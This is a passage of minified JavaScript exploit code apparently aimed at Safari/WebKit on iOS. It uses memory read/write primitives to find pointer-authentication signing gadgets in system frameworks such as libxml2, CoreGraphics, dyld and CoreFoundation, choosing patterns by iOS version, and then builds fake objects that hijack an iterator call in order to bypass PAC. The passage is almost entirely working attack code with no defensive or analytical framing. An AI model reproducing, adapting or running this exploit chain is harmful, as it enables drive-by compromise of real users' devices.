      c = platformModule.platformState.exploitPrimitive.read64(o + j(on.Ku)), 
      e = platformModule.platformState.exploitPrimitive.read64(c + j(on.Hu)), 
      l = nt.nd(cn(e)), 
      r = new or(l), 
      
      i = r.Ul({
        Dl: "_xmlSAX2GetPublicId", 
        vl: l.tl("libxml2.2.dylib"), 
        Ll: l.tl("libxml2.2.dylib") 
      });
    if (null === i) throw new Error("null === i");
    window.log(`[PAC] Found _xmlSAX2GetPublicId PAC-signed pointer`);
    let a;
    
    a = [7868719999, 7142789108, 7130414077, 6727681021, 7147095027, 7826571264, 1384120353, 6778795522, 7314866432, 7147095028, 7148340193, 6793607289, 7147095027, 7148405728, 6778795507, 7148340192, 7134608381, 7126274036, 7891521535];
    
    const s = r.Bl({
      Dl: "_dlfcn_globallookup",
      Ol: a,
      ol: l.tl("/System/Library/PrivateFrameworks/ActionKit.framework/ActionKit", "/System/Library/PrivateFrameworks/ActionKit.framework/Versions/A/ActionKit")
    });
    if (null === s) throw new Error("null === s");
    window.log(`[PAC] Found _dlfcn_globallookup gadget`);
    
    const u = r.Bl({
      Dl: "_autohinter_iterator_end",
      Ol: [7314866369, 8476692514, 7314866306, 8476689440, 8476694561, 7887325279],
      ol: l.tl("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics")
    });
    if (null === u) throw new Error("null === u");
    window.log(`[PAC] Found _autohinter_iterator_end gadget`);
    
    const d = r.Bl({
      Dl: "'anonymous namespace'::begin(__int64)",
      Ol: [8476697608, 7314866376, 8476690691, 7314866307, 8476689664, 8476694786, 7887325311, 7891518400],
      ol: l.tl("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics")
    });
    if (null === d) throw new Error("null === d");
    window.log(`[PAC] Found anonymous::begin gadget`);
    
    const I = r.Bl({
      Dl: "enet_allocate_packet_payload_default",
      Ol: [7868719999, 7142789108, 7130414077, 6727681021, 7147095027, 7248744520, 8476781832, 7147160544, 7889422623, 7147095028, 7331643520, 7248744520, 8476783880, 7889422623, 8472496756, 7134608381, 7126274036, 7891521535],
      ol: l.tl("/System/Library/PrivateFrameworks/RESync.framework/RESync", "/System/Library/PrivateFrameworks/RESync.framework/Versions/A/RESync")
    });
    if (null === I) throw new Error("null === I");
    window.log(`[PAC] Found enet_allocate_packet_payload_default gadget`);
    
    const m = (() => {
        const n = r.Ml(cn(I), 560);
        if (2 !== n.length) throw new Error("2 !== n.length");
        return {
          ed: n[0], 
          ld: n[1] 
        };
      })(),
      
      [y, C] = (() => {
        const n = l.tl("libdyld.dylib").sl("__DATA_DIRTY");
        if (null === n) return null;
        const t = n.xl("__dyld4"); 
        if (null === t) return null;
        const o = platformModule.platformState.exploitPrimitive.read64(t.bl + 8n), 
          c = platformModule.platformState.exploitPrimitive.read64(cn(o)),
          e = platformModule.platformState.exploitPrimitive.read64(cn(c));
        return [o, tt.td(cn(e))]; 
      })();
    if (null === C) throw new Error("null === C");
    
    
    const b = (() => {
      const n = [null],
        
        t = [7868719999, 7142865917, 6727664637, 8476688393, 7364673929, 7842349352, 7841299747, 7842416932, 7147226080, 7147619298, 7126219773, 7868720127, 7685933008, 7364149328, 7855443488];
      let o;
      
      for (o = platformModule.platformState.iOSVersion >= 160400 ? [7147095025, 7147619312, 7868719391, 335544332, 7147095025, 7147619312, 7965051409, 335544328, 7147095025, 7147619312, 7868719455, 335544324, 7147095025, 7147619312, 7965052433, 7148209120, 7891518400] : [7314866720, 704840680, 7303347457, 1895825503, 6887112968, 1895828639, 1409286728, 704906224, 8338279967, 6889116176, 6710886417, 6731592241, 7393540656, 268435473, 6628049456, 7887323648, 7965049088, 7891518400, 7965051136, 7891518400, 7965050112, 7891518400, 7965052160, 7891518400]; n.length > 0;) {
        const c = r.Kl(C, t, n.pop());
        if (null === c) continue;
        n.push(c + 0x4n);
        const e = r.zl(c, 4 * t.length + 12);
        for (const n in e)
        if (2 !== e.length) continue;
        if (null !== r.Rl(e[0], o, 256)) return c;
      }
      return null;
    })();
    if (null === b) throw new Error("null === b");
    window.log(`[PAC] Found PAC dispatch gadget in dyld`);
    
    const {
      ua: g, 
      ma: h 
    } = (() => {
      let n, t;
      
      platformModule.platformState.iOSVersion >= 160400 ? (t = 0x10n, n = [7147095025, 7147619312, 7868719391, 335544332, 7147095025, 7147619312, 7965051409, 335544328, 7147095025, 7147619312, 7868719455, 335544324, 7147095025, 7147619312, 7965052433, 7148209120, 7891518400]) : (t = 0x8n, n = [7965049088, 7891518400, 7965051136, 7891518400, 7965050112, 7891518400, 7965052160, 7891518400]);
      let o = null;
      const c = (t) => r.Kl(C, n, t);
      if (platformModule.platformState.iOSVersion >= 160400)
      for (;;) {
        if (o = c(o), null === o) return null;
        if (o !== b) break; 
        o += j(0x4n * n.length);
      } else o = c(o);
      if (null === o) return null;
      return {
        ua: o - 0x40n, 
        ma: {
          pacda: o, 
          autia: o + 1n * t, 
          pacia: o + 2n * t, 
          autda: o + 3n * t 
        }
      };
    })();
    if (null === g) throw new Error("null === g");
    if (null === h.pacda) throw new Error("null === h.pacda");
    if (null === h.ha) throw new Error("null === h.ha");
    if (null === h.pacia) throw new Error("null === h.pacia");
    if (null === h.autda) throw new Error("null === h.autda");
    
    const p = (() => {
      const n = l.tl("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation").kl("_CFRunLoopObserverCreateWithHandler");
      if (null === n) return null;
      const t = r.Ml(n, 128);
      return 4 !== t.length ? null : {
        rd: n, 
        qa: t[1], 
        $a: t[2] 
      };
    })();
    if (null === p) throw new Error("null === p");
    window.log(`[PAC] Located CFRunLoopObserverCreateWithHandler — gadget chain complete`);
    return {
      Ya: { 
        Ua: i, 
        ja: s, 
        ad: null,
        sd: u, 
        ud: d, 
        dd: I 
      },
      od: l, 
      Oa: m, 
      Id: y, 
      md: C, 
      Ja: p, 
      yd: b, 
      ua: g, 
      Ba: { 
        pacda: h.pacda, 
        autia: h.autia, 
        pacia: h.pacia, 
        autda: h.autda 
      }
    };
  },
  Cd: null, 

  
  
  
  
  
  
  
  
  va(n, t, o, c, e, l, r) {
    const i = n[Symbol.iterator](),
      a = (() => {
        const n = platformModule.platformState.exploitPrimitive.getObjectAddress(i); 
        return platformModule.platformState.exploitPrimitive.read64(n + j(on.ou)); 
      })(),
      s = a + j(on.cu), 
      u = platformModule.platformState.exploitPrimitive.read64(a + j(on.eu)), 
      d = platformModule.platformState.exploitPrimitive.read64(a + j(on.ru)), 
      I = platformModule.platformState.exploitPrimitive.read64(a + j(on.lu)), 
      m = platformModule.platformState.exploitPrimitive.read64(s + j(on.Ku)); 
    
    null === en.Cd && (en.Cd = platformModule.platformState.exploitPrimitive.allocZeroBuffer(on.Lu));
    const y = en.Cd,
      C = platformModule.platformState.exploitPrimitive.read64(u + j(on.au)); 
    {
      
      const n = platformModule.platformState.exploitPrimitive.read32(C + j(on.su)), 
        t = platformModule.platformState.exploitPrimitive.read32(C + j(on.uu)), 
        o = 2 * (on.Xu + platformModule.platformState.exploitPrimitive.read32(C + j(t))),
        c = on.fu + o * n;
      if (c % 4 != 0) throw new Error("c % 4 != 0");
      
      const [e, l] = platformModule.platformState.exploitPrimitive.allocZeroBufferPair(o);
      for (let n = 0; n < c; n += 4) platformModule.platformState.exploitPrimitive.write32(l + j(n), platformModule.platformState.exploitPrimitive.read32(C + j(n)));
      const r = 2, 
        i = 4; 
      platformModule.platformState.exploitPrimitive.write32(l + j(on.Iu), i | r); 
      
      for (let o = 0; o < n; o++) {
        const n = l + j(on.mu + t * o);
        platformModule.platformState.exploitPrimitive.write32(n, 2);
        for (let o = 0; o < t; o++) platformModule.platformState.exploitPrimitive.patchByte(n + j(on.yu + o), 0);
      }
      
      const [b, g] = platformModule.platformState.exploitPrimitive.allocZeroBufferPair(192);
      platformModule.platformState.exploitPrimitive.write32(l + j(on.du), 48);
      {
        
        const n = I + j(on.Cu);
        for (let t = 0; t < 128; t++) platformModule.platformState.exploitPrimitive.write32(n + j(4 * t), 160);
      }
      
      platformModule.platformState.exploitPrimitive.write64(u + j(on.au), l), 
      platformModule.platformState.exploitPrimitive.write64(a + j(on.iu), g), 
      platformModule.platformState.exploitPrimitive.write32(d + j(on.bu), 8589934591 ),
      platformModule.platformState.exploitPrimitive.write32(s + j(on.hu), 160); 
      
      for (let n = 0; n < on.Lu; n += 4) platformModule.platformState.exploitPrimitive.write32(y + j(n), platformModule.platformState.exploitPrimitive.read32(m) + n);
    }
    const b = {
      bd: null, 
      gd: null 
    };
    let g;
    
    
    
    const h = { 
        hd: 8, 
        pd: 32, 
        Kd: 48 
      },
      p = 56, 
      K = { 
        Ld: 16 
      },
      L = 24, 
      X = { 
        hd: 72 
      },
      f = 80, 
      _ = { 
        hd: 8, 
        pd: 16, 
        Xd: 48 
      },
      M = 56, 
      T = platformModule.platformState.exploitPrimitive.allocZeroBuffer(p), 
      x = platformModule.platformState.exploitPrimitive.allocZeroBuffer(p), 
      k = platformModule.platformState.exploitPrimitive.allocZeroBuffer(L), 
      G = platformModule.platformState.exploitPrimitive.allocZeroBuffer(f), 
      D = platformModule.platformState.exploitPrimitive.allocZeroBuffer(M), 
      {
        Ua: w, 
        sd: S, 
        ud: A, 
        dd: Z 
      } = t;
    
    
    
    platformModule.platformState.exploitPrimitive.write64(y + j(on.Hu), S), 
    platformModule.platformState.exploitPrimitive.write64(s + j(on.Ku), y), 
    platformModule.platformState.exploitPrimitive.write64(s + j(on.gu), T), 
    platformModule.platformState.exploitPrimitive.write64(k + j(K.Ld), 0x3333deadn), 
    platformModule.platformState.exploitPrimitive.write64(T + j(h.hd), k), 
    platformModule.platformState.exploitPrimitive.write64(T + j(h.Kd), x), 
    platformModule.platformState.exploitPrimitive.write64(T + j(h.pd), Z), 
    b.bd = platformModule.platformState.exploitPrimitive.read64(o.ed), 
    b.gd = platformModule.platformState.exploitPrimitive.read64(o.ld), 
    platformModule.platformState.exploitPrimitive.write64(o.ed, S), 
    platformModule.platformState.exploitPrimitive.write64(o.ld, w), 
    platformModule.platformState.exploitPrimitive.write64(x + j(h.hd), G), 
    platformModule.platformState.exploitPrimitive.write64(x + j(h.Kd), l), 
    platformModule.platformState.exploitPrimitive.write64(x + j(h.pd), A), 
    platformModule.platformState.exploitPrimitive.write64(G + j(X.hd), D), 
    platformModule.platformState.exploitPrimitive.write64(D + j(_.hd), e), 
    platformModule.platformState.exploitPrimitive.write64(D + j(_.Xd), r), 
    platformModule.platformState.exploitPrimitive.write64(D + j(_.pd), c); 
    
    
    
    try {
      i.next().value;
    } finally {
      
      g = platformModule.platformState.exploitPrimitive.read64(k + j(K.Ld)), 
      platformModule.platformState.exploitPrimitive.write64(o.ed, b.bd), 
      platformModule.platformState.exploitPrimitive.write64(o.ld, b.gd), 
      platformModule.platformState.exploitPrimitive.write64(u + j(on.au), C), 
      platformModule.platformState.exploitPrimitive.write64(a + j(on.iu), 0x0n), 
      platformModule.platformState.exploitPrimitive.write64(s + j(on.Ku), m); 
    }
    return void 0 === g && W(), g; 
  }
};





return r;